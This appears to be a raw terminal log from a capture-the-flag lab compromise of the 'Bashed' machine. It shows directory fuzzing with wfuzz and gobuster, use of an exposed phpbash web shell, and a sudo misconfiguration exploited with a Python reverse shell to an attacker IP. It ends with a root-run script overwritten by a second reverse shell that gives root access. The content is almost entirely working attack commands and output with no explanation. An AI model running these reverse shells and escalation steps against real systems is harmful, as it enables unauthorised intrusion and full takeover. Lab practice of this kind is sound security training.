@@ -1,0 +1,224 @@
+
+┌──(kali㉿kali)-[~]
+└─$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/quickhits.txt --hc 404 http://10.10.10.68/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.68/FUZZ
+Total requests: 2565
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                           
+=====================================================================
+
+000000149:   403        11 L     32 W       299 Ch      ".htaccess-dev"                                   
+000000146:   403        11 L     32 W       297 Ch      ".ht_wsr.txt"                                     
+000000147:   403        11 L     32 W       290 Ch      ".hta"                                            
+000000150:   403        11 L     32 W       301 Ch      ".htaccess-local"                                 
+000000148:   403        11 L     32 W       295 Ch      ".htaccess"                                       
+000000151:   403        11 L     32 W       301 Ch      ".htaccess-marco"                                 
+000000165:   403        11 L     32 W       299 Ch      ".htaccessOLD2"                                   
+000000153:   403        11 L     32 W       299 Ch      ".htaccess.bak"                                   
+000000157:   403        11 L     32 W       302 Ch      ".htaccess.sample"                                
+000000166:   403        11 L     32 W       296 Ch      ".htaccess~"                                      
+000000168:   403        11 L     32 W       295 Ch      ".htpasswd"                                       
+000000171:   403        11 L     32 W       296 Ch      ".htpasswds"                                      
+000000164:   403        11 L     32 W       298 Ch      ".htaccessOLD"                                    
+000000172:   403        11 L     32 W       294 Ch      ".htusers"                                        
+000000170:   403        11 L     32 W       300 Ch      ".htpasswd_test"                                  
+000000167:   403        11 L     32 W       294 Ch      ".htgroup"                                        
+000000169:   403        11 L     32 W       299 Ch      ".htpasswd-old"                                   
+000000163:   403        11 L     32 W       298 Ch      ".htaccessBAK"                                    
+000000155:   403        11 L     32 W       299 Ch      ".htaccess.old"                                   
+000000159:   403        11 L     32 W       299 Ch      ".htaccess.txt"                                   
+000000156:   403        11 L     32 W       300 Ch      ".htaccess.orig"                                  
+000000154:   403        11 L     32 W       300 Ch      ".htaccess.bak1"                                  
+000000162:   403        11 L     32 W       298 Ch      ".htaccess_sc"                                    
+000000161:   403        11 L     32 W       300 Ch      ".htaccess_orig"                                  
+000000152:   403        11 L     32 W       299 Ch      ".htaccess.BAK"                                   
+000000158:   403        11 L     32 W       300 Ch      ".htaccess.save"                                  
+000000160:   403        11 L     32 W       301 Ch      ".htaccess_extra"                                 
+000001017:   200        0 L      0 W        0 Ch        "config.php"                                      
+000001210:   200        17 L     69 W       1148 Ch     "dev/"                                            
+000001480:   403        11 L     32 W       296 Ch      "index.phps"                                      
+000001799:   301        9 L      28 W       308 Ch      "php"                                             
+000002098:   403        11 L     32 W       300 Ch      "server-status/"                                  
+000002366:   200        1 L      1 W        14 Ch       "uploads/"                                        
+
+Total time: 0
+Processed Requests: 2565
+Filtered Requests: 2532
+Requests/sec.: 0
+
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirb/common.txt -t 30 -x php,txt,sh,html
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.68
+[+] Method:                  GET
+[+] Threads:                 30
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,sh,html,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 290]
+/.hta.txt             (Status: 403) [Size: 294]
+/.hta.php             (Status: 403) [Size: 294]
+/.htaccess            (Status: 403) [Size: 295]
+/.hta.sh              (Status: 403) [Size: 293]
+/.hta.html            (Status: 403) [Size: 295]
+/.htaccess.php        (Status: 403) [Size: 299]
+/.htpasswd.sh         (Status: 403) [Size: 298]
+/.htpasswd.txt        (Status: 403) [Size: 299]
+/.htaccess.txt        (Status: 403) [Size: 299]
+/.htaccess.html       (Status: 403) [Size: 300]
+/.htaccess.sh         (Status: 403) [Size: 298]
+/.htpasswd.php        (Status: 403) [Size: 299]
+/.htpasswd            (Status: 403) [Size: 295]
+/.htpasswd.html       (Status: 403) [Size: 300]
+/.html                (Status: 403) [Size: 291]
+/.php                 (Status: 403) [Size: 290]
+/about.html           (Status: 200) [Size: 8193]
+/config.php           (Status: 200) [Size: 0]
+/contact.html         (Status: 200) [Size: 7805]
+/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
+/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
+/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
+/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
+/index.html           (Status: 200) [Size: 7743]
+/index.html           (Status: 200) [Size: 7743]
+/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
+/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]
+/server-status        (Status: 403) [Size: 299]
+/single.html          (Status: 200) [Size: 7477]
+/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
+Progress: 23070 / 23075 (99.98%)
+===============================================================
+Finished
+===============================================================
+                              
+
+
+dev/ brings us to a working terminal (phpbash)
+ www-data@bashed:/var/www/html/dev#
+
+
+www-data@bashed
+:/var/www/html/dev# id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@bashed
+:/var/www/html/dev# sudo -l
+
+Matching Defaults entries for www-data on bashed:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+(scriptmanager : scriptmanager) NOPASSWD: ALL
+
+
+sudo -u scriptmanager python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444                       
+listening on [any] 4444 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.68] 36876
+bash: cannot set terminal process group (822): Inappropriate ioctl for device
+bash: no job control in this shell
+scriptmanager@bashed:/var/www/html/dev$ cd /home/scriptmanager
+cd /home/scriptmanager
+scriptmanager@bashed:~$ ls
+ls
+scriptmanager@bashed:~$ ls -la
+ls -la
+total 28
+drwxr-xr-x 3 scriptmanager scriptmanager 4096 Dec  4  2017 .
+drwxr-xr-x 4 root          root          4096 Dec  4  2017 ..
+-rw------- 1 scriptmanager scriptmanager    2 Dec  4  2017 .bash_history
+-rw-r--r-- 1 scriptmanager scriptmanager  220 Dec  4  2017 .bash_logout
+-rw-r--r-- 1 scriptmanager scriptmanager 3786 Dec  4  2017 .bashrc
+drwxr-xr-x 2 scriptmanager scriptmanager 4096 Dec  4  2017 .nano
+-rw-r--r-- 1 scriptmanager scriptmanager  655 Dec  4  2017 .profile
+scriptmanager@bashed:~$ cd ..
+cd ..
+scriptmanager@bashed:/home$ ls
+ls
+arrexel
+scriptmanager
+scriptmanager@bashed:/home$ find / -type f -name "user.txt" 2>/dev/null
+find / -type f -name "user.txt" 2>/dev/null
+/home/arrexel/user.txt
+scriptmanager@bashed:/home$ cd /home/arrexel/
+cd /home/arrexel/
+scriptmanager@bashed:/home/arrexel$ ls
+ls
+user.txt
+scriptmanager@bashed:/home/arrexel$ cat user.txt
+
+
+scriptmanager@bashed:/$ ls
+ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+scripts
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+scriptmanager@bashed:/$ ls -la /scripts
+ls -la /scripts
+total 16
+drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
+drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
+-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
+-rw-r--r--  1 root          root            12 Aug 14 03:37 test.txt
+scriptmanager@bashed:/$ 
+
+
+scriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.10",5555));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/bash","-i"])' > /scripts/test.py
+<;subprocess.call(["/bin/bash","-i"])' > /scripts/test.py                    
+scriptmanager@bashed:/scripts$ cat test.py
+cat test.py
+import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.10",5555));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/bash","-i"])
+scriptmanager@bashed:/scripts$ 
+
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 5555        
+listening on [any] 5555 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.68] 48894
+bash: cannot set terminal process group (1138): Inappropriate ioctl for device
+bash: no job control in this shell
+root@bashed:/scripts# id
+id
+uid=0(root) gid=0(root) groups=0(root)
